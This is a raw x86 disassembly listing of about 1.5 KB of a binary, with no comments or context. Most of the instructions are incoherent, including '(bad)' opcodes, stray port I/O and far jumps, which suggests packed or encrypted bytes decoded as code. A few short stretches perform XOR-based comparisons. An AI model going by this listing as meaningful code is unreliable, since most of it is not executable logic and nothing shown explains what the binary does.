  410c23:	arpl   WORD PTR [ecx+0x3b5381ac],bp
  410c29:	sub    cl,BYTE PTR [esi]
  410c2b:	xchg   edx,eax
  410c2c:	add    ebp,DWORD PTR [ecx-0x38]
  410c2f:	rcl    esp,cl
  410c31:	mov    eax,ds:0x64b35a76
  410c36:	mov    esi,0x922a262d
  410c3b:	ficom  DWORD PTR [edi-0x31]
  410c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c3f:	jp     0x410cae
  410c41:	out    dx,al
  410c42:	xchg   esi,eax
  410c43:	jne    0x410c5f
  410c45:	or     eax,0xc783ec47
  410c4a:	mov    BYTE PTR [edx+edi*4],dl
  410c4d:	cmp    DWORD PTR [edi],0x5b2dbc25
  410c53:	in     al,0x4d
  410c55:	cs jl  0x410c29
  410c58:	call   0x68a9305
  410c5d:	test   BYTE PTR [ebx+eax*8-0x40],0xed
  410c62:	in     eax,0xd8
  410c64:	(bad)  
  410c65:	(bad)  
  410c66:	adc    esi,ecx
  410c68:	andps  xmm1,XMMWORD PTR [ebx-0x4]
  410c6c:	and    al,0x4a
  410c6e:	cmp    BYTE PTR [edi+0x21],ch
  410c71:	push   0xffffffdd
  410c73:	test   eax,0x46e04cb4
  410c78:	in     eax,dx
  410c79:	stos   BYTE PTR es:[edi],al
  410c7a:	int3   
  410c7b:	or     BYTE PTR ds:0x2c88594e,bl
  410c81:	push   ecx
  410c82:	out    0x1,al
  410c84:	fisub  DWORD PTR [ebp+0x7250ad32]
  410c8a:	and    eax,0x2d96f3ae
  410c8f:	mov    ebx,ebx
  410c91:	adc    DWORD PTR [ebp-0x47729862],ebx
  410c97:	into   
  410c98:	push   ebp
  410c99:	dec    eax
  410c9a:	xlat   BYTE PTR ds:[ebx]
  410c9b:	push   edi
  410c9c:	push   edx
  410c9d:	(bad)  
  410c9e:	fnstsw WORD PTR [ecx]
  410ca0:	out    0x7,al
  410ca2:	mov    ah,0x98
  410ca4:	jmp    0x410cdd
  410ca6:	and    esp,DWORD PTR [ebp+0x15]
  410ca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410caa:	imul   ebp,DWORD PTR [ebx-0x5f],0x11
  410cae:	or     ebx,DWORD PTR [ebx+0x4f]
  410cb1:	enter  0xe449,0x53
  410cb5:	call   0xb75e220
  410cba:	mov    ebp,0xe7b5182
  410cbf:	pop    ebx
  410cc0:	loope  0x410cc7
  410cc2:	jnp    0x410cc1
  410cc4:	mov    eax,ds:0xb3ac61ea
  410cc9:	mov    eax,0x183cecd5
  410cce:	mul    BYTE PTR [esi+0x43]
  410cd1:	push   cs
  410cd2:	jb     0x410cd7
  410cd4:	jle    0x410d3c
  410cd6:	repz jecxz 0x410ced
  410cd9:	das    
  410cda:	push   ebp
  410cdb:	mov    esp,0x863ba282
  410ce0:	mov    edi,0x8c72dd8a
  410ce5:	loop   0x410ce1
  410ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ce8:	loop   0x410d42
  410cea:	lock inc eax
  410cec:	daa    
  410ced:	mov    ecx,0x41b99772
  410cf2:	out    dx,al
  410cf3:	sbb    BYTE PTR [esi-0x5a],cl
  410cf6:	out    dx,al
  410cf7:	jge    0x410d44
  410cf9:	xchg   ebx,eax
  410cfa:	addr16 and ebp,ebx
  410cfd:	mov    al,0x38
  410cff:	push   0xffffffa9
  410d01:	fst    DWORD PTR [ebx]
  410d03:	jp     0x410d6d
  410d05:	cmp    al,0x44
  410d07:	shl    dl,0xbb
  410d0a:	(bad)
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x95bd779c
  410d25:	shr    ebx,cl
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	push   ebx
  410d2f:	les    esi,FWORD PTR [esi-0x2aa83c88]
  410d35:	and    eax,0x916d544b
  410d3a:	popa   
  410d3b:	sub    al,0x13
  410d3d:	mov    ss,edi
  410d3f:	push   0x9a5479e7
  410d44:	ja     0x410d02
  410d46:	adc    DWORD PTR [eax-0x5c],edx
  410d49:	xchg   esi,eax
  410d4a:	mov    cl,0x2e
  410d4c:	pop    ecx
  410d4d:	das    
  410d4e:	dec    esp
  410d4f:	js     0x410dce
  410d51:	bnd jnp 0x410d5a
  410d54:	inc    esp
  410d55:	or     eax,0x49af055c
  410d5a:	fistp  QWORD PTR [esi+ebp*1]
  410d5d:	das    
  410d5e:	repz push es
  410d60:	mov    eax,0x651d2d42
  410d65:	stos   BYTE PTR es:[edi],al
  410d66:	fcomp  DWORD PTR [ebp+0x407e5960]
  410d6c:	mov    ebx,0xbf3d44e3
  410d71:	fwait
  410d72:	mov    ah,0x7
  410d74:	jmp    0x750d:0xcbe15762
  410d7b:	rol    BYTE PTR [edi-0x37],cl
  410d7e:	mov    al,ds:0x45e18b2f
  410d83:	or     BYTE PTR [edi-0x29],cl
  410d86:	push   ss
  410d87:	pop    ebp
  410d88:	jge    0x410dfd
  410d8a:	cs cdq 
  410d8c:	test   DWORD PTR [eax-0x36],ecx
  410d8f:	(bad)
  410d92:	jnp    0x410d69
  410d94:	cmp    eax,0xe27fa874
  410d99:	aas    
  410d9a:	push   0xffffffef
  410d9c:	ins    DWORD PTR es:[edi],dx
  410d9d:	mov    ch,0x59
  410d9f:	fs stc 
  410da1:	jl     0x410e21
  410da3:	and    DWORD PTR [ebp-0x3e],edx
  410da6:	adc    DWORD PTR [edi],0x6f653323
  410dac:	psubw  mm2,QWORD PTR [edx+0x39]
  410db0:	out    dx,al
  410db1:	cmp    al,0xd3
  410db3:	clc    
  410db4:	test   ch,0x45
  410db7:	les    esp,FWORD PTR [esi]
  410db9:	pop    eax
  410dba:	dec    ecx
  410dbb:	mov    dh,0x38
  410dbd:	push   ss
  410dbe:	inc    ebp
  410dbf:	jge    0x410d44
  410dc1:	test   BYTE PTR ds:0xa3eed355,dh
  410dc7:	ins    BYTE PTR es:[edi],dx
  410dc8:	xchg   esi,eax
  410dc9:	int3   
  410dca:	shl    DWORD PTR [edx-0xb21952],1
  410dd0:	sar    DWORD PTR [edx],cl
  410dd2:	cmc    
  410dd3:	mov    ah,0xf2
  410dd5:	jno    0x410d9f
  410dd7:	cmp    DWORD PTR [ecx-0x37cd3754],esp
  410ddd:	ja     0x410dcf
  410ddf:	aaa    
  410de0:	xchg   bl,dh
  410de2:	popa   
  410de3:	mov    bh,0xde
  410de5:	icebp  
  410de6:	imul   ebx,ecx,0x54d8310d
  410dec:	push   cs
  410ded:	mov    ds:0xc8ec2927,al
  410df2:	idiv   BYTE PTR fs:[ecx+0x7]
  410df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410df7:	hlt    
  410df8:	or     eax,0x2e6141d1
  410dfd:	ret    0xbdca
  410e00:	push   ds
  410e01:	pop    eax
  410e02:	ss jae 0x410e12
  410e05:	arpl   WORD PTR [ebx-0x60bfc717],bp
  410e0b:	adc    DWORD PTR [ecx],esi
  410e0d:	jb     0x410e6e
  410e0f:	(bad)  
  410e10:	xchg   ebp,eax
  410e11:	test   BYTE PTR [esi],ah
  410e13:	jle    0x410e35
  410e15:	int3   
  410e16:	push   es
  410e17:	pop    eax
  410e18:	or     ebp,DWORD PTR [eax]
  410e1a:	inc    esp
  410e1b:	out    0xa9,al
  410e1d:	lea    ebp,[eax]
  410e1f:	and    eax,0x6d75ac70
  410e24:	pusha  
  410e25:	in     eax,0x27
  410e27:	fist   WORD PTR [edi+eax*2+0x6a3b1ec]
  410e2e:	pop    eax
  410e2f:	adc    cl,BYTE PTR [esi-0x7f9334a0]
  410e35:	add    DWORD PTR [edx-0x1f52eb1a],ebx
  410e3b:	jnp    0x410e91
  410e3d:	xchg   edx,eax
  410e3e:	mov    esi,0x7e7d17e9
  410e43:	push   ecx
  410e44:	outs   dx,BYTE PTR ds:[esi]
  410e45:	or     al,dh
  410e47:	pop    esp
  410e48:	mov    ecx,0x32b07466
  410e4e:	and    BYTE PTR [ebx+0x7e48084a],bl
  410e54:	mul    BYTE PTR [edx+0x2a]
  410e57:	sbb    ebp,DWORD PTR [edi]
  410e59:	xchg   esi,eax
  410e5a:	mov    edx,0xf1f7c9b
  410e5f:	or     al,0xdf
  410e61:	dec    edx
  410e62:	jbe    0x410df5
  410e64:	ror    ecx,0x53
  410e67:	ins    BYTE PTR es:[edi],dx
  410e68:	xchg   ebx,eax
  410e69:	test   al,0xa0
  410e6b:	loope  0x410e30
  410e6d:	adc    eax,0xae0355bb
  410e72:	pusha  
  410e73:	cwde   
  410e74:	lods   eax,DWORD PTR ds:[esi]
  410e75:	sub    DWORD PTR ds:0x4eeb203,edi
  410e7b:	inc    eax
  410e7c:	mov    edx,0x264b5b21
  410e81:	lea    edi,[eax+edi*2-0x58b7aaa8]
  410e88:	adc    BYTE PTR [edi],al
  410e8a:	mov    es,edi
  410e8c:	sub    dh,BYTE PTR [edi+0x39]
  410e8f:	mov    esp,0xb71e3869
  410e94:	xchg   ebx,ecx
  410e96:	hlt    
  410e97:	mov    WORD PTR [eax+0x5d64a4a2],fs
  410e9d:	jno    0x410e76
  410e9f:	std    
  410ea0:	sub    al,0x15
  410ea2:	lahf   
  410ea3:	inc    edi
  410ea4:	sbb    eax,DWORD PTR [ecx+0x8c4aa8f]
  410eaa:	test   BYTE PTR ds:0x7507e03,ah
  410eb0:	xchg   ebx,eax
  410eb1:	and    BYTE PTR [eax-0x19],ah
  410eb4:	dec    ecx
  410eb5:	xchg   edi,eax
  410eb6:	inc    ebx
  410eb7:	imul   ebx,DWORD PTR [ebp+0x37f24163],0x77e316f2
  410ec1:	js     0x410eac
  410ec3:	xchg   BYTE PTR [eax-0x6b766e8d],bh
  410ec9:	mov    al,ds:0x769f75e5
  410ece:	lods   eax,DWORD PTR ds:[esi]
  410ecf:	sub    eax,0xd4d8e734
  410ed4:	mov    WORD PTR ds:0x871a385a,gs
  410eda:	lahf   
  410edb:	pop    ecx
  410edc:	addr16 mov esp,0xfc288f66
  410ee2:	inc    eax
  410ee3:	repz out 0x22,eax
  410ee6:	(bad)  
  410ee7:	int    0x9f
  410ee9:	inc    eax
  410eea:	fisttp WORD PTR [edi+edi*4-0x10]
  410eee:	xor    BYTE PTR [edx],0x44
  410ef1:	mov    esp,0xb931b948
  410ef6:	ror    ebx,0xea
  410ef9:	shr    DWORD PTR [ebp+0x78e30bc6],cl
  410eff:	and    BYTE PTR [ebp+0x66370baf],bl
  410f05:	(bad)
  410f09:	pop    ss
  410f0a:	and    cl,BYTE PTR [esp+esi*2]
  410f0d:	and    bh,BYTE PTR [edi]
  410f0f:	sbb    al,0x5b
  410f11:	dec    edi
  410f12:	popa   
  410f13:	(bad)
  410f16:	adc    BYTE PTR [ebx-0x5],ch
  410f19:	hlt    
  410f1a:	cmp    al,0xb5
  410f1c:	push   edi
  410f1d:	dec    esi
  410f1e:	sahf   
  410f1f:	out    0x1,al
  410f21:	je     0x410f12
  410f23:	ror    BYTE PTR [edi-0x13637738],cl
  410f29:	mov    al,0xa6
  410f2b:	aam    0x5b
  410f2d:	mov    ds:0xa49f42c5,al
  410f32:	dec    ecx
  410f33:	jae    0x410f9e
  410f35:	lock outs dx,DWORD PTR ds:[esi]
  410f37:	jno    0x410f3b
  410f39:	hlt    
  410f3a:	xor    al,BYTE PTR [edx+0x3f]
  410f3d:	or     al,0xde
  410f3f:	sbb    al,0x7c
  410f41:	inc    edx
  410f42:	std    
  410f43:	add    BYTE PTR [edi+0x26e3abf3],0x61
  410f4a:	cmp    al,0x3b
  410f4c:	rol    BYTE PTR [esi-0x7573b215],1
  410f52:	(bad)  
  410f53:	and    ebp,0x43
  410f56:	inc    esi
  410f57:	mul    BYTE PTR [ebx]
  410f59:	rcl    eax,1
  410f5b:	ja     0x410fad
  410f5d:	add    ebp,DWORD PTR [eax-0x53]
  410f60:	fidiv  DWORD PTR [esi]
  410f62:	in     eax,0x6a
  410f64:	repz out dx,al
  410f66:	xchg   DWORD PTR [ebx],esp
  410f68:	out    0x4c,al
  410f6a:	cmp    ebp,ecx
  410f6c:	lods   eax,DWORD PTR ds:[esi]
  410f6d:	jle    0x410f90
  410f6f:	add    dl,0x48
  410f72:	cli    
  410f73:	jl     0x410f63
  410f75:	xor    al,bh
  410f77:	jnp    0x410f80
  410f79:	inc    esi
  410f7a:	addr16 inc esp
  410f7c:	pop    esi
  410f7d:	rol    BYTE PTR [edx+ecx*2+0x13],0x3a
  410f82:	scas   eax,DWORD PTR es:[edi]
  410f83:	jae    0x410fd6
  410f85:	xchg   esp,eax
  410f86:	mov    BYTE PTR [ebp-0x317e5835],al
  410f8c:	inc    eax
  410f8d:	rcr    DWORD PTR [edi+0x46],1
  410f90:	loope  0x410f83
  410f92:	dec    esp
  410f93:	(bad)  
  410f94:	lods   eax,DWORD PTR ds:[esi]
  410f95:	dec    ebx
  410f96:	stos   BYTE PTR es:[edi],al
  410f97:	cwde   
  410f98:	test   DWORD PTR cs:[eax-0x7954e47],eax
  410f9f:	popf   
  410fa0:	int    0xd7
  410fa2:	dec    ecx
  410fa3:	mov    ds:0x2fec293b,al
  410fa8:	mov    ah,BYTE PTR [ecx+0x5c8adb2a]
  410fae:	push   0xd336bfa4
  410fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fb4:	dec    edx
  410fb5:	dec    ebp
  410fb6:	sbb    DWORD PTR [edi],ebp
  410fb8:	lahf   
  410fb9:	jle    0x410fe2
  410fbb:	inc    esp
  410fbc:	mov    edx,DWORD PTR [ecx+0x54]
  410fbf:	data16 cwd 
  410fc2:	mov    WORD PTR [ebp-0x5c0fac1],?
  410fc8:	add    al,0xe3
  410fca:	pop    esi
  410fcc:	and    eax,DWORD PTR [eax-0x5e]
  410fcf:	mov    ah,BYTE PTR [ebx-0x618e6322]
  410fd5:	fisubr DWORD PTR fs:[esi]
  410fd8:	loop   0x410fcc
  410fda:	mov    dl,0x1a
  410fdc:	sbb    DWORD PTR [esi+ebx*2],ebx
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x4110a9
  41102b:	adc    ah,0x21
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x410fcd
  411037:	jb     0x410fe6
  411039:	ja     0x4110a5
  41103b:	mov    ds:0x4093b27e,al
  411040:	pop    ds
  411041:	jg     0x4110a4
  411043:	inc    esp
  411044:	mov    al,0x42
  411046:	cdq    
  411047:	pop    ebp
  411048:	xor    edx,DWORD PTR [esi+ebp*4]
  41104b:	std    
  41104c:	xor    eax,DWORD PTR [ecx+edi*1-0x34]
  411050:	sar    BYTE PTR [ebp-0x5c473049],cl
  411056:	jecxz  0x410fec
  411058:	sub    edi,DWORD PTR [ecx+0x59e0b82c]
  41105e:	add    eax,0xc6b7af84
  411063:	xor    BYTE PTR [esi+0x6f],ch
  411066:	test   DWORD PTR [ebp+0x4b76f621],0x93a219de
  411070:	or     BYTE PTR [eax+0x4c9aa54a],0x66
  411077:	(bad)  
  411078:	sahf   
  411079:	push   edx
  41107a:	add    eax,0xda739ed8
  41107f:	clc    
  411080:	jno    0x41108b
  411082:	add    BYTE PTR [eax-0x25],dl
  411085:	and    BYTE PTR ds:0x42d9b94c,dh
  41108b:	out    0x42,al
  41108d:	int3   
  41108e:	mov    al,0x9
  411090:	jecxz  0x4110ec
  411092:	es push esi
  411094:	outs   dx,BYTE PTR ds:[esi]
  411095:	pop    edi
  411096:	je     0x4110cf
  411098:	mov    WORD PTR [ebx+0x71],fs
  41109b:	rol    DWORD PTR [ecx],cl
  41109d:	jg     0x41108b
  41109f:	int    0x73
  4110a1:	xchg   ebp,eax
  4110a2:	push   edx
  4110a3:	add    ecx,DWORD PTR [ebx-0xe]
  4110a6:	ja     0x4110fb
  4110a8:	in     eax,0xd8
  4110aa:	or     dh,BYTE PTR [ebx]
  4110ac:	sar    bl,cl
  4110ae:	loop   0x4110db
  4110b0:	fsub   QWORD PTR [edx]
  4110b2:	ins    BYTE PTR es:[edi],dx
  4110b3:	leave  
  4110b4:	inc    esp
  4110b5:	xor    DWORD PTR [eax],0xdc1a4cf0
  4110bb:	push   ds
  4110bc:	aas    
  4110bd:	mov    esp,0xb3cf73f6
  4110c2:	add    DWORD PTR [ebx+0x2d],0x25
  4110c6:	stc    
  4110c7:	add    eax,0xfd63609a
  4110cc:	gs (bad) 
  4110ce:	and    edi,edi
  4110d0:	neg    BYTE PTR [edx+0x13d20d46]
  4110d6:	stos   BYTE PTR es:[edi],al
  4110d7:	add    eax,0xb9525d54
  4110dc:	push   ecx
  4110dd:	mov    ecx,0xadd5d4ae
  4110e2:	jns    0x4110de
  4110e4:	daa    
  4110e5:	clc    
  4110e6:	aad    0x22
  4110e8:	shl    ch,cl
  4110ea:	dec    ebp
  4110eb:	sub    DWORD PTR [edx],edx
  4110ed:	je     0x4110be
  4110ef:	inc    ebp
  4110f0:	fnsave [edi+eax*2+0x4dbd184]
  4110f7:	(bad)  
  4110f8:	push   ebp
  4110f9:	mov    eax,ds:0x6c586cb3
  4110fe:	inc    esp
  4110ff:	mov    ebp,DWORD PTR [ebx-0x20]
  411102:	dec    eax
  411103:	xchg   DWORD PTR [ebx],ecx
  411105:	cmp    ebx,eax
  411107:	rcl    edx,cl
  411109:	fnsave [ecx-0x29]
  41110c:	pop    ds
  41110d:	cmp    BYTE PTR [edi-0x35],0x1d
  411111:	jb     0x4110ef
  411113:	mov    edx,0x58b90334
  411118:	mov    cl,0x72
  41111a:	jle    0x411150
  41111c:	jbe    0x411125
  41111e:	nop
  41111f:	jl     0x411158
  411121:	dec    ecx
  411122:	dec    ecx
  411123:	pushf  
  411124:	cwde   
  411125:	xlat   BYTE PTR ds:[ebx]
  411126:	fsin   
  411128:	jo     0x4110bd
  41112a:	cwde   
  41112b:	jp     0x411116
  41112d:	mov    dh,bl
  41112f:	or     DWORD PTR [eax],0x4a
  411132:	dec    esi
  411133:	cmp    al,0x79
  411135:	fwait
  411136:	cli    
  411137:	push   0xc7cbcc52
  41113c:	mov    ecx,0x18ddff1b
  411141:	leave  
  411142:	add    eax,0x4cd29e5
  411147:	cmp    eax,0xd4d0582d
  41114c:	retf   
  41114d:	sahf   
  41114e:	jo     0x4111ce
  411150:	rcr    BYTE PTR [eax*1-0x42dcd1ce],1
  411157:	xchg   ebx,eax
  411158:	(bad)  [eax+0x18db10fd]
  41115e:	aaa    
  41115f:	inc    ecx
  411160:	dec    edi
  411161:	sbb    eax,0x2bd57a92
  411166:	dec    ecx
  411167:	push   ebx
  411168:	(bad)  
  411169:	sbb    al,0xfb
  41116b:	sti    
  41116c:	add    DWORD PTR [ecx-0x334489c],eax
  411172:	test   DWORD PTR [edx+0x2f],esi
  411175:	sub    DWORD PTR [esi+0x2286f53c],eax
  41117b:	lea    edi,es:[ebx]
  41117e:	xchg   edi,eax
  41117f:	cmovo  eax,DWORD PTR ds:0xc233
  411185:	shr    BYTE PTR [edx+0x18],0x8c
  411189:	daa    
  41118a:	stos   DWORD PTR es:[edi],eax
  41118b:	icebp  
  41118c:	mov    edi,DWORD PTR [edx-0x462236e2]
  411192:	stos   DWORD PTR es:[edi],eax
  411193:	xchg   edx,eax
  411194:	push   ds
  411195:	inc    esp
  411196:	xchg   ecx,eax
  411197:	test   al,0x5a
  411199:	push   esp
  41119a:	sti    
  41119b:	call   0xdba34155
  4111a0:	fs sti 
  4111a2:	(bad)  
  4111a3:	ins    DWORD PTR es:[edi],dx
  4111a4:	out    0x74,al
  4111a6:	adc    DWORD PTR [ebp+0x11bb76ec],edx
  4111ac:	test   esi,0xcb724254
  4111b2:	into   
  4111b3:	btr    ebx,ebp
  4111b6:	dec    esi
  4111b7:	adc    eax,0x30867b7f
  4111bc:	push   esp
  4111bd:	pusha  
  4111be:	xor    ebx,0x72
  4111c1:	add    DWORD PTR [edx+ebp*4-0x2d90790c],esp
  4111c8:	or     esi,ebp
  4111ca:	(bad)  
  4111cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111cc:	inc    edi
  4111cd:	std    
  4111ce:	inc    ebp
  4111cf:	mov    ch,0x4c
  4111d1:	rol    BYTE PTR [esi],1
  4111d3:	jae    0x41120c
  4111d5:	sbb    DWORD PTR [ecx+edx*2-0x5a],0xffffffaf
  4111da:	add    BYTE PTR [edx+0x6e],dh
  4111dd:	sub    al,0xab
  4111df:	jmp    0x2e69:0x4a803ca9
  4111e6:	jae    0x411201
  4111e8:	les    edi,FWORD PTR [edi]
  4111ea:	or     ah,bh
  4111ec:	popa   
  4111ed:	and    al,0x8d
  4111ef:	mov    ds:0xb8bd3db0,eax
  4111f4:	dec    esp
  4111f5:	(bad)  
  4111f6:	mov    eax,ds:0x68d9d09d
  4111fb:	addr16 aad 0xe
  4111fe:	shl    ebx,1
  411200:	loope  0x411246
  411202:	inc    eax
  411203:	or     al,0x82
  411205:	gs ds test al,0xb3
  411209:	pop    esp
  41120a:	push   eax
  41120b:	add    BYTE PTR [ebp+0x2f07f6f6],dh
  411211:	fistp  WORD PTR [edx+0x57]
  411214:	mov    ds:0x32b640b6,al
  411219:	push   edi
  41121a:	xchg   esi,eax
  41121b:	call   0x4d91:0xcc8fe8a2
  411222:	add    BYTE PTR ds:[edi],ch
  411225:	aad    0x75
  411227:	cmp    BYTE PTR [ecx+0x79],bl
  41122a:	das    
  41122b:	pop    esi
  41122c:	loopne 0x4111ee
  41122e:	mov    BYTE PTR [ebp+esi*2-0xd],ah
  411232:	add    eax,0x8a3ac1d
  411237:	mov    dl,0x48
  411239:	retf   
  41123a:	xor    BYTE PTR [ecx*8-0x6307b28c],0x2d
  411242:	jecxz  0x411265
  411244:	xchg   ebp,eax
  411245:	(bad)  
  411246:	cdq    
  411247:	jne    0x41128d
  411249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41124a:	scas   al,BYTE PTR es:[edi]
  41124b:	shr    BYTE PTR [eax+0x7b],cl
  41124e:	out    0xe3,eax
  411250:	fs call 0x27a9d13d
  411256:	adc    al,0x68
  411258:	call   0xd77bbd6a
  41125d:	es pop ecx
  41125f:	jge    0x4112aa
  411261:	mov    dh,0x46
  411263:	fisub  WORD PTR [ecx]
  411265:	std    
  411266:	out    0xf4,eax
  411268:	out    dx,al
  411269:	mov    esp,0x3058ad80
  41126e:	mov    es,WORD PTR [ecx+0x79]
  411271:	das    
  411272:	and    edx,ebp
  411274:	ficom  DWORD PTR [ecx+ebx*8+0x55]
  411278:	xchg   ebx,eax
  411279:	cmp    ah,bl
  41127b:	fs xor eax,0x6c6c090f
  411281:	mov    bl,0x0
  411283:	jp     0x411229
  411285:	cli    
  411286:	or     al,0xb
  411288:	aam    0x39
  41128a:	pop    ss
  41128b:	inc    esp
  41128c:	mov    eax,0x72ce647
  411291:	loop   0x4112c0
  411293:	and    ebx,ecx
  411295:	mov    edi,0xdf481b91
  41129a:	inc    esp
  41129b:	cdq    
  41129c:	loope  0x4112e9
  41129e:	inc    esp
  41129f:	inc    ebp
  4112a0:	pop    eax
  4112a1:	stos   DWORD PTR es:[edi],eax
  4112a2:	xor    al,0xbe
  4112a4:	out    dx,eax
  4112a5:	mov    edi,0xe5ce7559
  4112aa:	repz push cs
  4112ac:	es movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112af:	addr16 push esi
  4112b1:	push   ds
  4112b2:	ja     0x41127b
  4112b4:	push   ebx
  4112b5:	rol    ebp,1
  4112b7:	and    al,0x29
  4112b9:	cmp    DWORD PTR [eax-0x19ff41fe],edi
  4112bf:	jmp    FWORD PTR [ebx]
  4112c1:	inc    esi
  4112c2:	je     0x411263
  4112c4:	adc    al,0x9
  4112c6:	jl     0x4112a4
  4112c8:	sub    esi,esi
  4112ca:	sbb    ebp,DWORD PTR [ebp+0x64788526]
  4112d0:	aam    0xc1
  4112d2:	mov    WORD PTR [ecx-0x4fa42bbd],?
  4112d8:	shl    DWORD PTR [ebp-0x56c65de],0x1b
  4112df:	pop    edi
  4112e0:	inc    eax
  4112e1:	jle    0x41128f
  4112e3:	hlt    
  4112e4:	dec    esi
  4112e5:	aas    
  4112e6:	in     al,0xf
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0xa568f61e,eax
  411318:	jo     0x411350
  41131a:	mov    cs,WORD PTR [ecx+0x45]
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x4112b5
  411324:	mov    esp,0x2bd38300
  411329:	inc    edx
  41132a:	adc    BYTE PTR [ebx+0xf642daf],al
  411330:	shr    DWORD PTR [ecx],1
  411332:	inc    ecx
  411333:	loope  0x411367
  411335:	ins    BYTE PTR es:[edi],dx
  411336:	enter  0xb9d9,0xd0
  41133a:	xor    eax,0xcea3b289
  41133f:	outs   dx,BYTE PTR ds:[esi]
  411340:	pop    eax
  411341:	test   DWORD PTR [ecx],ecx
  411343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411344:	or     esp,DWORD PTR ds:0xfebe4933
  41134a:	ins    BYTE PTR es:[edi],dx
  41134b:	and    DWORD PTR [edx-0x57],edx
  41134e:	inc    ecx
  41134f:	loop   0x411360
  411351:	fistp  WORD PTR [edx-0x1287d08]
  411357:	not    DWORD PTR [edi]
  411359:	call   0x163e0656
  41135e:	adc    al,0x6f
  411360:	or     ecx,eax
  411362:	ret    0x1cb3
  411365:	jge    0x4112ec
  411367:	cmp    cl,BYTE PTR [esp+edi*2-0x41221142]
  41136e:	ins    BYTE PTR es:[edi],dx
  41136f:	(bad)  
  411370:	outs   dx,DWORD PTR ds:[esi]
  411371:	std    
  411372:	push   ss
  411373:	adc    DWORD PTR [edi],edx
  411375:	mov    eax,0x91ab1866
  41137a:	mov    cs:0xd27afdd4,al
  411380:	je     0x411359
  411382:	int    0x3f
  411384:	inc    esi
  411385:	sbb    al,0x39
  411387:	std    
  411388:	mov    bl,0x63
  41138a:	mov    ecx,0x9efd09cd
  41138f:	add    eax,0xe956ce18
  411394:	sbb    eax,0xcd601ae1
  411399:	cmp    BYTE PTR [eax],dl
  41139b:	xor    esp,eax
  41139d:	inc    BYTE PTR [ebp+edx*8-0x12]
  4113a1:	pop    esp
  4113a2:	mov    eax,ds:0x83aeef2c
  4113a7:	int    0xba
  4113a9:	pop    es
  4113aa:	dec    esp
  4113ab:	jle    0x4113e3
  4113ad:	inc    eax
  4113ae:	pop    edi
  4113af:	jecxz  0x411376
  4113b1:	leave  
  4113b2:	outs   dx,BYTE PTR ds:[esi]
  4113b3:	pop    es
  4113b4:	cld    
  4113b5:	add    al,0x4c
  4113b7:	add    al,BYTE PTR [ebp-0x9]
  4113ba:	push   edx
  4113bb:	dec    ebx
  4113bc:	cmpxchg eax,eax
  4113bf:	nop
  4113c0:	inc    edx
  4113c1:	loope  0x411350
  4113c3:	aas    
  4113c4:	mov    ebp,0x3869f35d
  4113c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113ca:	call   esp
  4113cc:	mov    WORD PTR [esi+ebx*4],ss
  4113cf:	sub    eax,DWORD PTR [ebx+edi*4+0x1a]
  4113d3:	fsubp  st(3),st
  4113d6:	xor    eax,0x8c031ae3
  4113db:	xor    al,0xd0
  4113dd:	mov    ah,0x4
  4113df:	(bad)  
  4113e0:	jge    0x4113d6
  4113e2:	mov    esp,ds
  4113e4:	ret    
  4113e5:	adc    DWORD PTR [edi+esi*2],0xa337178c
  4113ec:	daa    
  4113ed:	or     DWORD PTR [esi+0x42d47226],edi
  4113f3:	popa   
  4113f4:	add    BYTE PTR [edi+0x33],al
  4113f7:	cld    
  4113f8:	jae    0x411427
  4113fa:	mov    esp,0xb32ae9e3
  4113ff:	cmc    
  411400:	cmp    eax,0xbdc01118
  411405:	or     ah,al
  411407:	aaa    
